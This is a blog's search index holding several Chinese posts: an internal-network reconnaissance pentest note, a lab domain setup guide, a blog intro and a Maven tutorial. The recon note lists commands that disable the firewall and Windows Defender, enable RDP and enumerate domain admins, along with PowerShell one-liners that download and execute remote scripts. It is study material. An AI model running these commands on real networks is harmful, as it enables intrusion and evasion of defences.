<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>内网信息收集</title>
      <link href="/posts/3.html"/>
      <url>/posts/3.html</url>
      
        <content type="html"><![CDATA[<h1 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h1><h2 id="工作组信息收集"><a href="#工作组信息收集" class="headerlink" title="工作组信息收集"></a>工作组信息收集</h2><h3 id="内网信息收集-1"><a href="#内网信息收集-1" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><ol><li><p>查询网络配置：ipconfig /all</p></li><li><p>查询用户列表： <img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111242351160.png"></p></li><li><p>查询进程列表：tasklist /v    和     wmic process list brief<img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250107584.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250108396.png"></p></li><li><p>查询操作系统以及安装软件版本信息</p><ol><li><p>获取操作系统和版本信息</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250214146.png"></p></li><li><p>查看安装软件以及版本，路径</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250116426.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250117372.png"></p></li></ol></li></ol><ol start="3"><li><p>查询端口列表</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250121208.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250122296.png"></p></li><li><p>查询补丁列表</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250123033.png"></p></li><li><p>查询本机共享</p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250128617.png"></p><p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250132135.png"></p></li><li><p>查询防火墙相关配置</p><p>​    1，关闭防火墙 A，windows server 2003系统及以前版本 Netsh firewall set opmode disable </p><p>​                            B，windows server 2003 之后系统版本 Netsh advfirewall set allprofiles state off/on </p><p>​    2，查看防火墙配置 Netsh firewall show config</p></li></ol><ol start="7"><li><p>查询并且开启远程连接服务</p><p>查询并开启远程连接服务 查看远程连接端口号 Reg query “hkey_local_machine\system\currentcontrolset\control\terminal  server\winstations\RDP-Tcp” /v portnumber </p><p>查看3389是否开启 Netstat –ano | findstr “3389” 开启远程连接服务 Windows server 2008和windows server 2016开启3389的方法 1, wmic /namespace:\root\cimv2\terminalservices path win32_terminalservicesetting where  (__CLASS != “”) call setallowtsconnections 1  2, wmic /namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where  (TerminalName =’RDP-Tcp’) call setuserauthenticationrequired 1  3, reg add “HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server” /v fSingleSessionPerUser /t  REG_DWORD /d 0 /f 以上前提条件是确保Windows Management Instrumentation（Winmgmt）服务已正常启动，权限需要</p></li><li><p>查看当前权限</p><ol><li><p>whoami（本地普通用户，域内用户bigbug888/administrator,whoami /all</p></li><li><p>Net user bigbug888/domain</p><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250206281.png" alt="image-20211125015956851" style="zoom: 50%;"></li></ol></li></ol><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><ol><li><p>判断是否有域</p><p>Iipconfig /all    和Systeminfo WORKGROUP   和Net config workstation  和Net time /domain</p></li></ol><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111250206720.png"></h3><ol start="2"><li><p>域内存活主机探测</p><ol><li>利用netbios快速探测内网（网络邻居协议，优先）</li></ol><p>工具：nbtscan</p><p>遇到win2016杀毒软件windows defender关不掉可在管理员cmd下输入（如果还是关不掉可以重启，可能是虚拟机没反应过来）</p><pre class="line-numbers language-none"><code class="language-none">reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /d 1 /t REG_DWORD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><p>使用vbs脚本       Cscript 1.vbs</p></li><li><p>利用arp扫描完整探测内网，</p><ol><li><p>arp-scan    命令  apr.exe -t ip arp.exe -t 192,168,5.0/24</p></li><li><p>empire中的arpscan模块</p></li><li><p>invoke-arpscan.ps1</p><pre class="line-numbers language-none"><code class="language-none">ps命令：远程下载运行：powershell –nop –exec bypass –c “IEX（new-Object net.webClient）.DownloadString(‘http://192.168.1.1/invoke-arpscan.ps1’);invoke-arpscan –CIDR 192.168.1.0/24”&gt;&gt;c:\windows\temp\log.txt本地运行：powershell.exe -exec bypass -Command "Import-Module ./InvokeARPScan.ps1;Invoke-ARPScan -CIDR 192.168.5.0/24”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol></li><li><p>利用常规的tcp/udp端口扫描探测内网</p><ol><li><p>工具：scanline</p></li><li><p>命令：</p><pre class="line-numbers language-none"><code class="language-none">sl –h –t 22,80-89,110,389,445,3389,1099,1433,2049,6379,7001,8080,1521,3306,5432 –u 53,161,137,139 –o c:\windows\temp\sl_res.txt –p 192.168.5.1-254 /b<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol></li></ol></li><li><p>域内端口扫描（注：扫描的时候要注意是否会触发IDS等安全设备警告）</p><ol><li><p>端口的banner信息</p></li><li><p>端口上运行的服务</p></li><li><p>常见应用的默认端口</p><pre class="line-numbers language-none"><code class="language-none">telnet命令命令：telnet ip端口Nmap工具扫描Metasploit模块 search portscaninvoke-portscan.ps1 powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/samratashok/nishang/blob/master/Scan/Invoke-PortScan.ps1');Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports '445,1433,80,8080,3389' -oA c:\ProgramData\ip_info"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol><p>​        域内基础信息收集：</p><pre class="line-numbers language-none"><code class="language-none">Net view /domain 查看域Net view /domain:xxx 查看xxx域内所有主机Net group /domain 查看用户组列表Net group “Domain Admins” /domain 查询域管理员列表Net accounts /domain 查看域用户密码策略Nltest /domain_trusts 查看域信任信息注意：这些域命令需要域权限（域用户）或system权限才能执行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​            <img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111251532168.png"></p><p>​        域控制器的查找<img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111251538192.png"></p><pre class="line-numbers language-none"><code class="language-none">Nltest /DCLIST:XXX 查看域控制器的名称Nslookup –type=SRV _ldap._tcpNet time /domain 查看域时间Net group “domain controllers” /domain 查看所有域控制器Netdom query pdc 查找域控制器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​    域内用户和管理员的获取<img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111251540244.png"></p><pre class="line-numbers language-none"><code class="language-none">查询所有域用户列表Net user /domain 查看域用户列表Wmic useraccount get /all 获取域内用户详细信息Dsquery user dc上面的命令，查询用户 加 –name xxx查看某个用户信息Net localgroup administrators /domain 查看administrators组内所有用户<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​        域内用户和管理员的获取<img src="https://gitee.com/tianfu6/img/raw/master/typoraimg/202111251542823.png"></p><pre class="line-numbers language-none"><code class="language-none">查询域管理员用户组Net group “domain admins” /domainNet group “Enterprise Admins” /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>​    定位域管理员</p><p>​        常规的定位域管理员的方法：</p><p>​                1.日志（指的是本地机器的管理员日志，可以使用脚本或者wevtutil导出查看）</p><p>​                2.会话（是域内每个机器的登录绘画，可以匿名查询，无需权限，可以使用netsess.exe或者powerview等工具查询）</p><p>​        常规定位域管理员的方法</p><p>​                    1.定位管理员工具</p><p>​                    2.查询域管理进程</p><p>​                    3.模拟域管理员</p><pre class="line-numbers language-none"><code class="language-none">1，定位域管理员工具Psloggedon.exe 查看本地登录的用户和通过本地计算机或远程计算机资源登录的用户PVEFindADUser.exe 查找活动目录用户登录的位置、枚举域用户Netsess.exe 查主机会话的工具Nmap 的NSE脚本Powerview 脚本-Invoke-UserHunterPowershell.exe –exec bypass –Command “&amp; {Import-Module C:\PowerView.ps1; Invoke-UserHunter}”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客与博主</title>
      <link href="/posts/1.html"/>
      <url>/posts/1.html</url>
      
        <content type="html"><![CDATA[<p>相遇皆是缘分</p><h3 id="为什么建博客？"><a href="#为什么建博客？" class="headerlink" title="为什么建博客？"></a>为什么建博客？</h3><p>肿么说了! 纯属个人兴趣，好玩，唉，就是玩!嘻嘻! 会有些成就感吧,拥有一个自己的博客写一些自己感兴趣的事或物,不是一件很酷的事嘛!</p><h3 id="展望博客"><a href="#展望博客" class="headerlink" title="展望博客"></a>展望博客</h3><p>我会整理一些个人所学的知识（学前端的，也会捣鼓捣鼓一些其它的专业的知识）或生活方面有兴趣的事发到博客上供大家观摩</p><p>溜溜球啦！</p>]]></content>
      
      
      <categories>
          
          <category> 生活 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 想法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网环境搭建1</title>
      <link href="/posts/2.html"/>
      <url>/posts/2.html</url>
      
        <content type="html"><![CDATA[<h3 id="1-windows-server-2016"><a href="#1-windows-server-2016" class="headerlink" title="1.windows server 2016"></a><strong>1.windows server 2016</strong></h3><p><img src="https://img-blog.csdnimg.cn/921ac98f6ae742c2952462ef5f61b2ae.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>管理-&gt;添加新角色</p><h2 id="2-安装域控制器和dns服务"><a href="#2-安装域控制器和dns服务" class="headerlink" title="2.安装域控制器和dns服务"></a><strong>2.安装域控制器和dns服务</strong></h2><p><img src="https://img-blog.csdnimg.cn/1754ed5a4c10415c95b0aad91279e6d9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>勾选active directory域服务器，dns服务器<br><img src="https://img-blog.csdnimg.cn/6336cf1060d64d31bae93ccaceb3b040.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9e5ed3942b8b405787c6569491ac3007.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="3-设置ip"><a href="#3-设置ip" class="headerlink" title="3.设置ip"></a><strong>3.设置ip</strong></h2><p><img src="https://img-blog.csdnimg.cn/799ad412ead14a799a09c4e4c9efbccf.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="4-更改计算机名字"><a href="#4-更改计算机名字" class="headerlink" title="4.更改计算机名字"></a><strong>4.更改计算机名字</strong></h2><p><img src="https://img-blog.csdnimg.cn/f57de7858fa04865a13ffe5022cfc57f.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="5-升级服务器（升级为域控）"><a href="#5-升级服务器（升级为域控）" class="headerlink" title="5.升级服务器（升级为域控）"></a><strong>5.升级服务器（升级为域控）</strong></h2><p><img src="https://img-blog.csdnimg.cn/2f5377a400894c819b7d1c92faa578ce.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b3103d49c8224f8990c8a3c893f7760c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_18,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/0d609280e39f454caeebf26aa4c1406b.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>遇到下面这种情况是因为电脑管理员密码没有设置<br><img src="https://img-blog.csdnimg.cn/a97b37caac8040589f06aef2f4819ff6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h2 id="6-创建active-directory用户"><a href="#6-创建active-directory用户" class="headerlink" title="6.创建active directory用户"></a><strong>6.创建active directory用户</strong></h2><p><img src="https://img-blog.csdnimg.cn/b0c3d473919c4071a066c2018ce1db15.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/bc20ff7a1c4d43c69008ddb22bc13d5a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/415a953052304f1b985b6c568303e5e0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9268f3fe52c940c18d503a641b3c498d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>然后使用win7加入该域<br><img src="https://img-blog.csdnimg.cn/ef71c64ff7944a2690f5ca07066389b3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_20,color_FFFFFF,t_70,g_se,x_16" alt="123" style="zoom:67%;"></p><p><img src="https://img-blog.csdnimg.cn/83992e8a4c7d45b9bd2e32aa80f24a6f.png?x-oss-process=image/watermark,%EF%BC%8Ctype_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6LCB5ouU5LqG5oiR55qE572R57q_5ZGA,size_17,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 网安 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven聚合工程</title>
      <link href="/posts/10.html"/>
      <url>/posts/10.html</url>
      
        <content type="html"><![CDATA[<h2 id="Maven聚合工程"><a href="#Maven聚合工程" class="headerlink" title="Maven聚合工程"></a>Maven聚合工程</h2><h4 id="1-Maven聚合工程概念"><a href="#1-Maven聚合工程概念" class="headerlink" title="1 Maven聚合工程概念"></a>1 Maven聚合工程概念</h4><blockquote><p>Maven聚合工程：就是可以在一个Maven父工程中创建多个组件(项目)，这个多个组件之间可以相互依赖，实现组件的复用</p></blockquote><p><img src="imgs/1618297506471.png" alt="1618297506471"></p><h4 id="2-创建Maven聚合工程"><a href="#2-创建Maven聚合工程" class="headerlink" title="2 创建Maven聚合工程"></a>2 创建Maven聚合工程</h4><h6 id="2-1-创建Maven父工程"><a href="#2-1-创建Maven父工程" class="headerlink" title="2.1 创建Maven父工程"></a>2.1 创建Maven父工程</h6><blockquote><p>Maven聚合工程的父工程 packing必须为 pom</p></blockquote><ul><li><p>创建一个Maven工程</p></li><li><p>修改父工程的pom.xml，设置打包方式为pom</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>父工程用于管理子工程，不进行业务实现，因此src目录可以选择性删除</p></li></ul><h6 id="2-2-创建Module"><a href="#2-2-创建Module" class="headerlink" title="2.2 创建Module"></a>2.2 创建Module</h6><ul><li><p>选择父工程—右键—New—Module</p></li><li><p>输入子工程名称（g和v都从父工程继承）</p></li><li><p>子工程的pom文件：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--module的pom继承 父工程的pom--&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>parent</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>parent</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>common<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>父工程的pom文件：</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>project</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">"</span></span>         <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modelVersion</span><span class="token punctuation">&gt;</span></span>4.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modelVersion</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.qfedu<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>maven-parent<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>    <span class="token comment">&lt;!--  声明当前父工程的子module  --&gt;</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>modules</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>module</span><span class="token punctuation">&gt;</span></span>common<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>module</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>modules</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>packaging</span><span class="token punctuation">&gt;</span></span>pom<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>packaging</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>project</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="3-Maven聚合工程依赖继承"><a href="#3-Maven聚合工程依赖继承" class="headerlink" title="3 Maven聚合工程依赖继承"></a>3 Maven聚合工程依赖继承</h4><h6 id="3-1-依赖继承"><a href="#3-1-依赖继承" class="headerlink" title="3.1 依赖继承"></a>3.1 依赖继承</h6><ul><li><p>在父工程的pom文件添加的依赖，会被子工程继承</p><p><img src="imgs/1618302248151.png" alt="1618302248151"></p></li></ul><h6 id="3-2-依赖版本管理"><a href="#3-2-依赖版本管理" class="headerlink" title="3.2 依赖版本管理"></a>3.2 依赖版本管理</h6><blockquote><p>在父工程的pom.xml的dependencyManagement中添加依赖，表示定义子工程中此依赖的默认版本（此定义并不会让子工程中添加当前依赖）</p></blockquote><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--  依赖管理：在dependencyManagement中添加依赖，表示定义子工程中此依赖的默认版本  --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencyManagement</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">&gt;</span></span>com.google.code.gson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">&gt;</span></span>gson<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>2.6.1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencyManagement</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> springboot项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tkmapper</title>
      <link href="/posts/11.html"/>
      <url>/posts/11.html</url>
      
